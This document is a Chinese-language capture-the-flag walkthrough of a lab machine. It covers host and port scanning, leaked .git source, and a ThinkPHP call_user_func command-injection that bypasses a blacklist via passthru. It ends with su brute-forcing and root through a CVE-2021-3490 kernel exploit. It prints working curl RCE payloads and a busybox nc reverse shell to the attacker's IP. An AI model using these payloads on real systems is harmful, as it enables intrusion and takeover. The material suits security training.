# 一、信息收集

## 1. 主机发现

首先，在当前网段内进行主机发现，确定目标IP地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l           
...
192.168.205.131 08:00:27:2b:fe:37       PCS Systemtechnik GmbH
...
```

发现存活主机 `192.168.205.131`。

## 2. 端口扫描

使用 Nmap 对目标主机进行全端口扫描，以识别开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.131
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 20:21 EDT
Nmap scan report for 192.168.205.131
Host is up (0.00017s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 08:00:27:2B:FE:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

扫描结果显示目标开放了两个端口：

*   **22/tcp**: SSH 服务
*   **8080/tcp**: HTTP 服务

# 二、Web渗透

## 1. Web应用识别

访问 `http://192.168.205.131:8080`，页面显示为一个赛博朋克风格的网站。

```html
<body>
    <h1>欢迎来到赛博朋克世界</h1>
    <p>这是一个使用ThinkPHP构建的赛博朋克风格的RCE。</p>
    ...
</body>
```

页面明确指出该应用是使用 **ThinkPHP** 框架构建的。

## 2. 目录与漏洞扫描

使用 `gobuster` 进行目录扫描，发现大量文件，但信息较为杂乱。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.131:8080 -w ...
...
/index.php            (Status: 200) [Size: 2295]
/robots.txt           (Status: 200) [Size: 24]
/system.zip           (Status: 200) [Size: 22]
...
```

使用 `nuclei` 进行自动化漏洞扫描，发现 `phpinfo.php` 泄露和 `.gitignore` 文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nuclei -u http://192.168.205.131:8080
...
[phpinfo-files] [http] [low] http://192.168.205.131:8080/phpinfo.php ...
[exposed-gitignore] [http] [info] http://192.168.205.131:8080/.gitignore
...
```

访问 `.gitignore` 文件，发现了一些被排除在版本控制之外的路径和文件，如 `.env` 和 `/vendor` 目录，这些通常包含敏感信息。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.131:8080/.gitignore          
*.log
.env
composer.phar
...
/vendor
...
```

尝试访问 `.env` 文件，虽然没有直接获取到配置信息，但返回的错误页面暴露了框架的详细版本：**ThinkPHP V8.1.3**。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.131:8080/.env
...
<div class="copyright">
    <a title="官方网站" href="http://www.thinkphp.cn">ThinkPHP</a> 
    <span>V8.1.3</span> 
    ...
</div>
...
```

## 3. Git源码泄露

使用 `dirsearch` 进一步扫描，确认了 `.git` 目录的存在，这意味着网站源码可能被泄露。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -u http://192.168.205.131:8080  
...
[20:35:40] 301 -  324B  - /.git  ->  http://192.168.205.131:8080/.git/
...
```

使用 `git-dumper` 工具将泄露的 `.git` 仓库完整下载到本地。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ git-dumper http://192.168.205.131:8080/ .                
...
[-] Running git checkout .
从索引区更新了 71 个路径
```

## 4. 代码审计

下载源码后，对关键文件进行审计，寻找漏洞。

* **`app/admin/controller/Admin.php`**:
  在 `Admin` 控制器中发现一个 `hello` 方法，其核心代码为 `call_user_func($b, $a);`。这是一个典型的命令执行漏洞，其中参数 `$a` 和 `$b` 均可通过URL传入，意味着我们可以控制调用的函数（`$b`）和其参数（`$a`）。

  ```php
  public function hello($a,$b)
  {
      call_user_func($b, $a); // 漏洞点
  }
  ```

* **`app/admin/route/app.php`**:
  路由文件显示，`sb/:a/:b` 路径被绑定到了 `Admin/hello` 方法。开发者注释“不知道为什么我这个路由是无效的”，但实际上，由于应用映射的配置 (`'app_map' => ["think"=>"admin"]`)，访问路径应为 `/think/admin/hello/...`。

  ```php
  Route::rule("sb/:a/:b","Admin/hello");
  ```

* **`app/middleware/Check1.php`**:
  `Admin` 控制器使用了 `Check1` 中间件，它会校验 `Session` 中的 `sb` 和 `token` 是否相等且不为空，这是一个简单的身份验证。

  ```php
  if ((Session::get("sb")==Session::get("token")&&!empty(Session::get("sb"))&&!empty(Session::get("token")))){
      return $next($request);
  }
  ```

* **`app/middleware/Check.php`**:
  存在一个全局中间件，通过黑名单正则过滤URL中的危险函数，如 `system`, `exec`, `eval` 等。但 `passthru` 等函数并未在黑名单中，可以绕过。

  ```php
  $pattern = '/\b(eval|exec|system|...|phpinfo)\b/i';
  ```

# 三、漏洞利用

## 1. 获取Token

根据代码审计，需要先获取一个合法的 `token` 才能访问后台控制器。`app/index/controller/Token.php` 文件逻辑显示，向 `/index.php/index/token/token` 发送 `sb=admin` 的POST请求即可获得`token`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/index.php/index/token/token -d "sb=admin" -c cookie.txt
...
<p class="message">获取成功: 2fce588f94d6d5edcfea90156254f130a4aed575</p>
...
```

## 2. RCE执行命令

携带上一步获取的`cookie`，构造Payload访问漏洞路由。我们使用 `passthru` 函数绕过黑名单检测，执行 `id` 命令。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/think/admin/hello/a/id/b/passthru -b cookie.txt
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

命令成功执行，当前用户为 `www-data`。

## 3. 反弹Shell

在本地监听端口：

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888                        
listening on [any] 8888 ...
```

构造反弹Shell的Payload，并进行URL编码后发送：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/think/admin/hello/a/busybox%20nc%20192%2E168%2E205%2E128%208888%20%2De%20bash/b/passthru -b cookie.txt
```

成功接收到反弹Shell，并使用`script`和`stty`等命令升级为交互式TTY。

# 四、权限提升

## 1. 用户切换

在 `/home` 目录下发现 `welcome` 用户，并在其家目录中找到一个名为 `.pwd` 的可疑文件，这可能是一个密码字典。

```bash
www-data@tpN:/home/welcome$ ls -al
...
-rw-r--r-- 1 root    root    3510 Jul 22 09:56 .pwd
-rw-r--r-- 1 root    root      26 Jul 24 09:27 uesr.txt
```

将`suForce`上传到目标服务器，并使用`suForce`工具进行爆破。

```bash
www-data@tpN:/tmp$ ./suForce -u welcome -w pass
...
💥 Password | eecho
...
```

成功爆破出 `welcome` 用户的密码为 `eecho`。切换用户成功。

```bash
www-data@tpN:/tmp$ su welcome
Password: eecho
welcome@tpN:/tmp$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

## 2. 内核漏洞提权

切换到 `welcome` 用户后，执行 `sudo -l` 发现没有sudo权限。上传并运行 `linpeas.sh` 脚本进行提权漏洞扫描，发现系统内核可能存在 **CVE-2021-3490** 漏洞。

```bash
...
[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops
   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
   Exposure: probable
...
```

下载并编译该漏洞的exploit。

```bash
welcome@tpN:/tmp$ busybox wget https://.../CVE-2021-3490/zip/main
welcome@tpN:/tmp$ unzip main 
welcome@tpN:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main$ make
gcc -DGROOVY -o bin/exploit.bin -I include/ exploit.c bpf.c kmem_search.c
```

执行exploit，成功获取root权限。

```bash
welcome@tpN:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main/bin$ ./exploit.bin 
...
[!] preparing to overwrite creds...
[+] success! enjoy r00t :)
# id
uid=0(root) gid=0(root) groups=0(root),1000(welcome)
```

# 五、夺取Flag

在root权限下，读取用户和root的flag。

```bash
root@tpN:/# cat /root/root.txt /home/welcome/uesr.txt 
flag{root-不错不错}
flag{user-eecho123456789}
```

渗透测试完成。